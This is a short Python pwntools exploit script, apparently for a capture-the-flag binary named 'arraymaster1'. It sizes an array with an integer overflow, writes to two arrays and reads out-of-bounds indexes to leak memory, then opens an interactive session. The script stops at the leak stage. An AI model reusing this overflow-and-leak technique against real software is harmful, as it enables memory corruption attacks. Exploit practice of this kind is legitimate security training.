from pwn import *

p=process('./arraymaster1')
e=ELF('./arraymaster1')
pause()

def list_info(p):
    p.recvuntil('\n> ')
    p.sendline('list')
    log.info('[LISTING]')

def init(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('init {} {} {}'.format(a,b,c))
    log.info('[INIT ARR] <{}>'.format(a))
    log.info(p.recvline())
def delete(p,a):
    p.recvuntil('\n> ')
    p.sendline('delete {}'.format(a))
    log.info('[DELETE ARR] <{}>'.format(a))


def set_(p,a,b,c):
    p.recvuntil('\n> ')
    p.sendline('set {} {} {}'.format(a,b,c))
    log.info('[SET VALUE] ARR<{}> index<{}> val<{}>')

def get(p,a,b):
    p.recvuntil('\n> ')
    p.sendline('get {} {}'.format(a,b))
    log.info('[GET DATA] ARR<{}> index<{}>')
    return p.recvline()

def quit(p):
    p.recvuntil('\n> ')
    p.sendline('quit')


init(p,'A',64,(0xffffffffffffffff+1)/8)
init(p,'B',64,10)
#for i in range(1):
set_(p,'A',1,123)
set_(p,'B',1,456)
for i in range(20):
 print '[idx]: {}'.format(i)
 log.info('[LEAKED]: '+hex(int(get(p,'B',i),16)))
 sleep(0.2)

p.interactive()
             



